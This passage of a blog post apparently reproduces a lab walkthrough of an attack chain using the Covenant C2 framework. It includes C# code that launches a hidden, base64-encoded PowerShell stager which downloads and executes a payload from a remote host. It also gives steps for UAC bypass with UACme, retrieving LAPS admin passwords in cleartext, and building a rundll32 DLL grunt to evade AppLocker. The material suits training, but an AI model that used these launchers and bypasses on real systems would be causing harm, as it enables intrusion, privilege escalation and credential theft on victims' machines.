<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ~ &gt; git <span class="hljs-built_in">clone</span> --recurse-submodules https://github.com/cobbr/Covenant<br>$ ~ &gt; <span class="hljs-built_in">cd</span> Covenant/Covenant<br>$ ~/Covenant/Covenant &gt; dotnet build<br>$ ~/Covenant/Covenant &gt; dotnet run<br></code></pre></div></td></tr></table></figure>

<p>Next, we will add Covenant as our C2 for the infrastructure. First, make sure that you have network visibility of the covenant instance. Then, double click the gateway and choose Command center -&gt; TurnOnConnectorCovenant.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image341.png" srcset="/img/loading.gif"></p>
<p>After a while, you should be able to see a new infra member as well as a new listener in the Covenant panel. Also, we will launch the C2Bridge using the command line:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">dotnet</span> C<span class="hljs-number">2</span>Bridge.dll <span class="hljs-number">192.168.139.214</span> <span class="hljs-number">8000</span> <span class="hljs-number">8000</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image342.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image343.png" srcset="/img/loading.gif"></p>
<p>In the next step, double-click on the relay and choose “Add Peripherial Grunt”. We change connect attemtps to 300 as well as change Pipe name to something longer.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image344.png" srcset="/img/loading.gif"></p>
<p>This might take up to 2-3 minutes to set up. Once done, you will see a new infra member as well as a new SMBGrunt on the Covenant panel.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image345.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image346.png" srcset="/img/loading.gif"></p>
<p>From that place, you can freely interact with the target machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image347.png" srcset="/img/loading.gif"></p>
<h2 id="Hybrid-binary-powershell-launcher"><a href="#Hybrid-binary-powershell-launcher" class="headerlink" title="Hybrid binary-powershell launcher"></a>Hybrid binary-powershell launcher</h2><p><strong>Note, that this exercise is to be executed locally, but you can try it as well in the lab environment.</strong></p>
<p>For basic persistence, you might want to create an .exe out of your powershell launcher. Let’s try to compose a .NET assembly which will run a powershell stager command.</p>
<p>First, open Visual Studio and choose New Project. Choose Console App (.NET Framework)</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image348.png" srcset="/img/loading.gif"></p>
<p>Use the following code to create an assembly that will launch the powershell stager:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//Program.cs</span><br><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Collections.Generic;<br><span class="hljs-keyword">using</span> System.Diagnostics;<br><span class="hljs-keyword">using</span> System.Linq;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Threading.Tasks;<br><br><span class="hljs-keyword">namespace</span> Service<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span></span><br><span class="hljs-class">    &#123;</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">(<span class="hljs-built_in">string</span>[] args)</span> </span>&#123;<br>            var gruntStartInfo = <span class="hljs-keyword">new</span> ProcessStartInfo&#123;<br>                FileName = <br>         @<span class="hljs-string">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span>,                                  Arguments = @<span class="hljs-string">&quot;powershell -Sta -Nop -Window Hidden -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEA&quot;</span><br>            &#125;;<br>            <span class="hljs-keyword">using</span> (var grunt = <span class="hljs-keyword">new</span> Process<br>                   &#123;<br>                       StartInfo = gruntStartInfo<br>                   &#125;)<br>            &#123;<br><br>            grunt.Start();<br>        &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>Of course, paste your launcher code into the second argument. Compile with configuration Release/Any CPU.</p>
<p>Move the Service.exe binary to your attacker machine where you can start to interact with a High Integrity grunt. We are uploading it to user’s location which is very likely to be writable anyway - c:\users\win10en\AppData\Local\Temp\Service.exe. It can later be used as a local payload - for persistence purposes.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image349.png" srcset="/img/loading.gif"></p>
<h2 id="Bypassing-UAC"><a href="#Bypassing-UAC" class="headerlink" title="Bypassing UAC"></a>Bypassing UAC</h2><p>Note, that this exercise is to be executed locally.</p>
<p>There is a great tool for bypassing UAC named UACme.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
<p>You can compile any executable from that suite and try to transfer it to the remote OS. When compiling the .sln file you might have to manually change the Build Tools version in the Project options. You can do it by right clicking on each solution and changing version from “v142 - not installed” to older one, v141. Also note we are compiling the project as x64.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image350.png" srcset="/img/loading.gif"></p>
<p>We will use the Akagi64.exe binary from the suite. You can transfer it to a Victim machine using any technique you like - for example the Shell command at the Grunt menu.</p>
<p>After compilation, Akagi64.exe is renamed to a.exe and uploaded to the target machine:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image351.png" srcset="/img/loading.gif"></p>
<p>Moreover, a binary launcher is generated to be launched with elevated permissions - this means, we also need to upload it and then provide it as an argument to Akagi64.exe (a.exe)</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image352.png" srcset="/img/loading.gif"></p>
<p>We saved our launcher as c:\users\admin\binary.exe. Then we run it with the “Shell” command task:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image353.png" srcset="/img/loading.gif"></p>
<p>In that case method no 49 worked and we received a High integrity grunt.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image354.png" srcset="/img/loading.gif"></p>
<h2 id="Windows-Defenses"><a href="#Windows-Defenses" class="headerlink" title="Windows Defenses"></a>Windows Defenses</h2><p><strong>Note, that this technique cannot be executed within the lab</strong></p>
<p>One of the defenses built in into the Windows OS is LAPS (Local Administrator Password Management Solution). It provides rules for managing passwords for local administrator across computers in the domain. Using it, it is possible to make sure that local admin accounts have different and complex passwords which are also automatically changed on a regular basis.</p>
<p>This prevents SAM abuses. LAPS has to be installed to a target system in order to take effect.</p>
<p>In order to deal with LAPS, you can use a tool available on github:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShell/GPRegistryPolicy">https://github.com/PowerShell/GPRegistryPolicy</a></p>
<p>Using it, you are able to parse .pol GPO policy files, which contain interesting information about requirements for the passwords enforced by LAPS.</p>
<p>When a computer executes a Group Policy update, the first thing to be done is to check if the password has been expired or not. If so, a new random password is generated and set up, and then it is stored in AD as an attribute to its own computer object.</p>
<p>These attributes are</p>
<ul>
<li><p>  ms-Mcs-AdmPwd</p>
</li>
<li><p>  ms-Mcs-AdmPwdExpirationTime</p>
</li>
</ul>
<p>These attributes can be read only by Domain Admins group members. If you have sufficient permission, you can try to retrieve these passwords using powershell:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-AdmPwdPassword -ComputerName <span class="hljs-type">NAME</span> | <span class="hljs-keyword">select</span> <span class="hljs-keyword">Password</span><br></code></pre></div></td></tr></table></figure>

<p>You will be able to obtain the password in clear-text.</p>
<p>This can also be achieved using PowerView:</p>
<figure class="highlight mathematica"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mathematica"><span class="hljs-variable">PowerShell</span> <span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">DomainObject</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Identity</span> <span class="hljs-variable">MACHINE</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Properties</span> <span class="hljs-variable">ms</span><span class="hljs-operator">-</span><span class="hljs-variable">Mcs</span><span class="hljs-operator">-</span><span class="hljs-variable">AdmPwd</span><br></code></pre></div></td></tr></table></figure>

<h2 id="Using-Covenant-in-Applocker-enabled-environments"><a href="#Using-Covenant-in-Applocker-enabled-environments" class="headerlink" title="Using Covenant in Applocker-enabled environments"></a>Using Covenant in Applocker-enabled environments</h2><p><strong>Note, that this exercise is preferred to be executed locally</strong></p>
<p>Applocker is a Windows’ feature present on systems since Windows 7. By default, it is turned off.</p>
<p>In short, it allows to restrict executable content that can be launched by a machine or domain users. It can be set at the GPO or local machine level.</p>
<p>Applocker applies these restrictions using rules named policies. They can apply to several basic kinds of files, that applocker can identify. These are Executables (e.g. .com, .exe), Windows installer files ((e.g. .msi, .msp, mst), Scripts ((e.g. .js, .vba, .vbs, .bat, .ps1), App installers ((e.g. .appx), and DLL Files (e.g. .dll)</p>
<p>To manage applocker, one has to possess administrative rights over a machine / domain and then go to computer (or domain) policies e.g. using secpol.msc</p>
<p>We will focus on bypassing applocker policies on a single machine level, but be aware that the same logic applies for bypassing domain-level applocker. The origin of restrictions is different, but their effect is the same.</p>
<p>You do not need to follow the process presented below, but if you want to experiment with applocker you are free to do it on the UATSERVER machine.</p>
<p>First thing we need to do is to start the “AppIDSvc” service as well as set its start to “automatic” so it will persist regardless of any reboots.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image355.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image356.png" srcset="/img/loading.gif"></p>
<p>As we go back to the main console of secpol.msc, we can expand the AppLocker list right-click on “executable rules”. Then, click “Add New Rule”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image357.png" srcset="/img/loading.gif"></p>
<p>We choose “Deny” and in “Path” downloads are restricted. The final rules are shown on the below screenshot:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image358.png" srcset="/img/loading.gif"></p>
<p>These rules say that anyone can run files that are Program Files or Windows directories - green “allow” ones are rules created by default by applocker.</p>
<p>They prevent you from locking yourself up when setting up restrictive rules. Also, a default rule that allows administrators to run anything is deleted.</p>
<p>We can see that two “deny” rules disallow users to run files in c:\users\appsvc\temp* and in Downloads*.</p>
<p>At the end of the configuration, “Configure rule enforcement” is chosen and all rules are set to “Enforce rules” mode.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image359.png" srcset="/img/loading.gif"></p>
<p>In such case, even if we are able to execute code on the remote machine, we could have trouble running any additional executables.</p>
<p>Say we already have a session with UATSERVER which can be achieved e.g. via pivoting shown previously or a SMB grunt.</p>
<p>In the case of a new environment, we are unable to verify, what are exactly the restrictions.</p>
<p>Basically, applocker can often be bypassed by finding a weak point or an exception in its rules. Note that in an unknown environment we could generate lots of alerts when trying to execute something that applocker doesn’t allow.</p>
<p>Luckily, we can utilize built-in powershell cmdlets in order to enumerate the effective applocker policy:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-ApplockerPolicy -<span class="hljs-keyword">Local</span><br></code></pre></div></td></tr></table></figure>

<p>We can see that it was possible to retrieve the current applocker policy</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image360.png" srcset="/img/loading.gif"></p>
<p>However, is it not readable in this format. But it is possible to redirect the output to a file:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Get</span>-AppLockerPolicy -Effective -<span class="hljs-type">Xml</span> | <span class="hljs-keyword">Set</span>-Content (<span class="hljs-string">&#x27;c:\windows\tracing\policy.xml&#x27;</span>)<br></code></pre></div></td></tr></table></figure>

<p>The given cmdlet will retrieve the effective applocker policy and store it in a file.</p>
<p>After using that command in the Interact tab, we can try to Download that file:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image361.png" srcset="/img/loading.gif"></p>
<p>As the task is completed, we can go to Data and download the file.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image362.png" srcset="/img/loading.gif"></p>
<p>At the end of the file, we can see that there is an exception folder provided for running executables.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image363.png" srcset="/img/loading.gif"></p>
<p>In that case, downloading and moving a file to the exception folder will allow its execution.</p>
<p>Other popular bypasses of applocker, apart from changing execution directories, might involve using legitimate windows executables that have a code execution capability. There is a community-supported project LOLBAS which is focused on discovering such legitimate binaries that might lead to executing other files.</p>
<p><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p>
<p>For example, such execution can be achieved with using rundll32.exe to run another dll-formatted payload. The LOLBAS project contains information about dozens of similar binaries, so most likely you will find a bypass candidate that is not known by the sysadmin.</p>
<h2 id="Bypassing-applocker-with-DLL-Launcher"><a href="#Bypassing-applocker-with-DLL-Launcher" class="headerlink" title="Bypassing applocker with DLL Launcher"></a>Bypassing applocker with DLL Launcher</h2><p>In order to create a rundll32-runable grunt first you need to generate a Binary launcher.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image364.png" srcset="/img/loading.gif"></p>
<p>We use a HTTP Listener to which the target machine will be allowed to connect to.</p>
<p>Next, we click “Generate” and then we go to “Code”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image365.png" srcset="/img/loading.gif"></p>
<p>We will use that Grunt code to create a DLL grunt loader.</p>
<p>Let’s open Visual Studio and create new project of type C# Library</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image366.png" srcset="/img/loading.gif"></p>
<p>Next, paste the Grunt code into ClassLibrary1.cs</p>
<p>You will need however to make some additions. First, create a new class:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image367.png" srcset="/img/loading.gif"></p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exports</span> &#123;</span><br>    [DllExport(<span class="hljs-string">&quot;GruntEntry&quot;</span>, CallingConvention = <br> CallingConvention.Cdecl)]<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">GruntEntry</span><span class="hljs-params">(IntPtr hwnd, IntPtr hinst, <span class="hljs-built_in">string</span> </span></span><br><span class="hljs-params"><span class="hljs-function"> lpszCmdLine, <span class="hljs-keyword">int</span> nCmdShow)</span></span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">new</span> GruntStager();<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>Now, you will need to add two new imports.</p>
<p>First, add</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams"><span class="hljs-keyword">using</span> <span class="hljs-keyword">System</span>.Runtime.InteropServices;<br></code></pre></div></td></tr></table></figure>

<p>Next, you will need to add a Nuget Package. Go to Project Manage -&gt; Nuget Packages and Browse for UnmanagedExports</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image368.png" srcset="/img/loading.gif"></p>
<p>Install the latest version. Add it to the class by adding another import:</p>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">using</span> RGiesecke.DllExport;<br></code></pre></div></td></tr></table></figure>

<p>Then, go to Project Properties and change .NET framework version to 4.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image369.png" srcset="/img/loading.gif"></p>
<p>Also, click on “Any CPU”. Configuration manager will appear. Change “Any CPU” to x64.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image370.png" srcset="/img/loading.gif"></p>
<p>You can now build the solution.</p>
<p>With a DLL prepared in such way, you can run it using</p>
<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">rundll32 <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLibrary1</span>.</span></span>dll,GruntEntry<br></code></pre></div></td></tr></table></figure>

<p>We transfer the DLL library to UATSERVER using the Upload task. Regardless of the execution restriction, a dll grunt can be run. We also need to move it to the “Exception” directory which is located on the disk C.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image371.png" srcset="/img/loading.gif"></p>
<p>The grunt is activated from process “rundll32.exe”.</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
                    
                  </div>
                
              </div>
              
                
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%85%AD%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%89/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">攻击链六：域渗透案例三</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E4%BA%94%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%BA%8C/">
                        <span class="hidden-mobile">攻击链四：域渗透案例一</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


            

                
                  <a id="scroll-top-button" href="#" role="button">
                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
                  </a>
                  

                    
                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
                        

                          
      </main>

      <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>






  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



    </body>

  </html>